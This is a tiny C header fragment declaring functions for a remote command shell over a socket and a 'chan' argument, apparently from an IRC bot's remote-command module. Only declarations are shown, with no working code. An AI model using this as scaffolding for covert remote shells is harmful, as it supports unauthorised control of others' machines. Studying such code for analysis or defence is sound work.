#ifndef NO_REMOTECMD
void Close_Handles(void);
BOOL send_commands(char *commands);
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan,char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
#endif